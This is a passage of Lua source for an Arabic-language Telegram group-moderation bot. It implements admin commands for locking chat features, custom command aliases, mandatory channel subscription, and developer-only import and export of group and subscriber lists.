[𝘼𝙃𝙈𝙀𝘿𝙔𝘼𝘿](t.me/UUOUOU_7) [𝙋𝙊𝙒𝙀𝙍](t.me/SOPOWERB0T)
]]
keyboard = {}
keyboard.inline_keyboard = {
{{text = 'الـمـطـور', url="http://t.me/"..SUDOUSER}},
{{text = 'اضف '..Name_Bot..' الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},
} 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SOPOWERB0T&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

--[[
if text =='تغير المطور الاساسي' and SudoBot(msg) then
send(msg.chat_id_, msg.id_,'⋄ارسل ايدي المطور الاساسي الجديد')
database:set(bot_id..'Ed:SudoBot',true) 
end
if database:get(bot_id.."Ed:SudoBot") then
if text and text:match("^(%d+)$") then
local SUDON = text:match("^(%d+)$")
send(msg.chat_id_,msg.id_, "⋄تم تغير المطور الاساسي")
os.execute("rm -fr INFOBOT.lua")
local A = io.open("INFOBOT.lua", 'w')
A:write([[
token = "]..token..[["
SUDO = "]..SUDON..[[" 
])
A:close()
database:del(bot_id.."Ed:SudoBot")
dofile('INFOBOT.lua')  
dofile('Black.lua')  
end
end
]]--
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
if text == 'رفع الجروبات' or text == 'رفع الجروبات ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile_Bot(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'رفع المشتركين' or text == 'رفع المشتركين ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
local info_file = io.open('./users.json', "r"):read('*a')
local users = JSON.decode(info_file)
for k,v in pairs(users.users) do
database:sadd(bot_id..'User_Bot',v) 
end
send(msg.chat_id_,msg.id_,'تم رفع المشتركين ')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
--[[
if text == 'قائمه المجموعات' or text == 'المجموعات' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id.."Chek:Groups")
local t = "⋄ "..text.." \n~~~~~~~~~~~~\n"
for k,v in pairs(list) do
local idsgrops = v
name = database:smembers(bot_id.."name:Groups"..v)
for k,v in pairs(name) do
local nasgrops = v
t = t..k.." - المجموعه "..nasgrops.."\n{`"..idsgrops.."`}\n~~~~~~~~~~~~\n"
end
if #list == 0 then
t = '⋄ لا يوجد جروبات مفعله '
end
send(msg.chat_id_, msg.id_, t)
end
]]




if text == 'روابط الجروبات' or text == 'روابط المجموعات' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id.."Chek:Groups")
local Groupslink = database:get(bot_id.."Private:Group:Link")
local text = "~ Groups_Bots_In_the_Bot_Of_Source_POWER ~ @SOPOWERBOT\n\n\n"
for k,v in pairs(list) do
if k == 1 then
text = text..'"'..k.." Group ID  : [ "..v.." ]\nGroup Link : [ "..(Groupslink or 'Not Found').." ]\n~~~~~~~~~~~~~~~~~\n"
else
text = text..',"'..k.." Group ID  : [ "..v.." ]\nGroup Link : [ "..(Groupslink or 'Not Found').." ]\n~~~~~~~~~~~~~~~~~\n"
end
end
text = text..']}'
local file = io.open('Groups.txt', 'w')
file:write(text)
file:close()
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './Groups.txt', ' عدد الجروبات في الملف { '..#list..'}')
end
if text == 'جلب المشتركين' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
GetUsersBot(msg)
end
if text == 'جلب الجروبات' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
GetGroupsBot(msg)
end
if text == 'الاوامر المضافه' and Constructor(msg) then
local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_..'')
t = " ⋄قائمه الاوامر المضافه  \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
Cmds = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..v)
print(Cmds)
if Cmds then 
t = t..""..k..">> ("..v..") »> {"..Cmds.."}\n"
else
t = t..""..k..">> ("..v..") \n"
end
end
if #list == 0 then
t = " ⋄لا يوجد اوامر مضافه"
end
send(msg.chat_id_, msg.id_,'['..t..']')
end
if text == 'مسح الاوامر المضافه' or text == 'مسح الاوامر المضافه' then
if Constructor(msg) then 
local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_)
for k,v in pairs(list) do
database:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..v)
database:del(bot_id..'List:Cmd:Group:New'..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,' ⋄تم ازالة جميع الاوامر المضافه')  
end
end
if text == 'اضف امر' and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_,'true') 
send(msg.chat_id_, msg.id_,' ⋄ارسل الامر القديم')  
return false
end
if text == 'مسح امر' or text == 'مسح امر' then 
if Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_,'true') 
send(msg.chat_id_, msg.id_,' ⋄ارسل الامر الذي قمت بوضعه بدلا عن القديم')  
return false
end
end
if text and database:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
database:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,' ⋄ارسل الامر الجديد')  
database:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_)
database:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_,'true1') 
return false
end
if text and database:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_) == 'true1' then
local NewCmd = database:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text,NewCmd)
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,' ⋄تم حفظ الامر')  
database:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_)
return false
end
--------------------------------------------------------------------------------------------------------------
if text == 'قفل الدردشه' and msg.reply_to_message_id_ == 0 then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end 
database:set(bot_id.."lock:text"..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الدردشه ')
end,nil)   
elseif text == 'قفل الاضافه' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:set(bot_id.."lock:AddMempar"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n☉| تـم قفـل اضافة ')
end,nil)   
elseif text == 'قفل الدخول' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:set(bot_id.."lock:Join"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل دخول ')
end,nil)   
elseif text == 'قفل البوتات' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل البوتات ')
end,nil)   
elseif text == 'قفل البوتات بالطرد' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل البوتات بالطرد ')
end,nil)   
elseif text == 'قفل الاشعارات' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end  
database:set(bot_id..'lock:tagservr'..msg.chat_id_,true)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الاشعارات ')
end,nil)   
elseif text == 'قفل التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id.."lockpin"..msg.chat_id_, true) 
database:sadd(bot_id..'lock:pin',msg.chat_id_) 
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,data.pinned_message_id_)  end,nil)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل التثبيت ')
end,nil)   
elseif text == 'قفل التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'lock:edit'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل تعديل ')
end,nil)   
elseif text == 'قفل السب' and msg.reply_to_message_id_ == 0 then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end 
database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل السب ')
end,nil)  
elseif text == 'قفل الفارسيه' and msg.reply_to_message_id_ == 0 then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end 
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الفارسيه ')
end,nil)   
elseif text == 'قفل الانكليزيه' and msg.reply_to_message_id_ == 0 then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end 
database:set(bot_id..'lock:Engilsh'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الانكليزيه ')
end,nil)
elseif text == 'قفل الانلاين' and msg.reply_to_message_id_ == 0 then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end 
database:set(bot_id.."lock:inline"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الانلاين ')
end,nil)
elseif text == 'قفل تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'lock_edit_med'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل تعديل ')
end,nil)    
elseif text == 'قفل الكل' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:set(bot_id..'lock:tagservrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lsock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل جميع الاوامر ')
end,nil)   
end
if text == 'قفل الاباحي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Lock:Sexy"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الاباحي ')
end,nil)   
elseif text == 'فتح الاباحي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Lock:Sexy"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الاباحي ')
end,nil)   
end
if text == 'فتح الانلاين' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:del(bot_id.."lock:inline"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الانلاين ')
end,nil)
elseif text == 'فتح الاضافه' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:del(bot_id.."lock:AddMempar"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح اضافة ')
end,nil)   
elseif text == 'فتح الدردشه' and msg.reply_to_message_id_ == 0 then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end 
database:del(bot_id.."lock:text"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الدردشه ')
end,nil)   
elseif text == 'فتح الدخول' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:del(bot_id.."lock:Join"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح دخول ')
end,nil)   
elseif text == 'فتح البوتات' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فـتح البوتات ')
end,nil)   
elseif text == 'فتح البوتات بالطرد' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فـتح البوتات بالطرد ')
end,nil)   
elseif text == 'فتح الاشعارات' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end  
database:del(bot_id..'lock:tagservr'..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فـتح الاشعارات ')
end,nil)   
elseif text == 'فتح التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id.."lockpin"..msg.chat_id_)  
database:srem(bot_id..'lock:pin',msg.chat_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فـتح التثبيت ')
end,nil)   
elseif text == 'فتح التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'lock:edit'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فـتح تعديل ')
end,nil)   
elseif text == 'فتح السب' and msg.reply_to_message_id_ == 0 then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end 
database:del(bot_id..'lock:Fshar'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فـتح السب ')
end,nil)   
elseif text == 'فتح الفارسيه' and msg.reply_to_message_id_ == 0 then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فـتح الفارسيه ')
end,nil)   
elseif text == 'فتح الانكليزيه' and msg.reply_to_message_id_ == 0 then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end 
database:del(bot_id..'lock:Engilsh'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فـتح الانكليزيه ')
end,nil)
elseif text == 'فتح تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'lock_edit_med'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فـتح تعديل ')
end,nil)    
elseif text == 'فتح الكل' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:del(bot_id..'lock:tagservrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فـتح جميع الاوامر ')
end,nil)   
end
if text == 'قفل الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الروابط ')
end,nil)   
elseif text == 'قفل الروابط بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الروابط بالتقييد ')
end,nil)   
elseif text == 'قفل الروابط بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الروابط بالكتم ')
end,nil)   
elseif text == 'قفل الروابط بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الروابط بالطرد ')
end,nil)   
elseif text == 'فتح الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Link"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الروابط ')
end,nil)   
end
if text == 'قفل المعرفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل المعرفات ')
end,nil)   
elseif text == 'قفل المعرفات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل المعرفات بالتقييد ')
end,nil)   
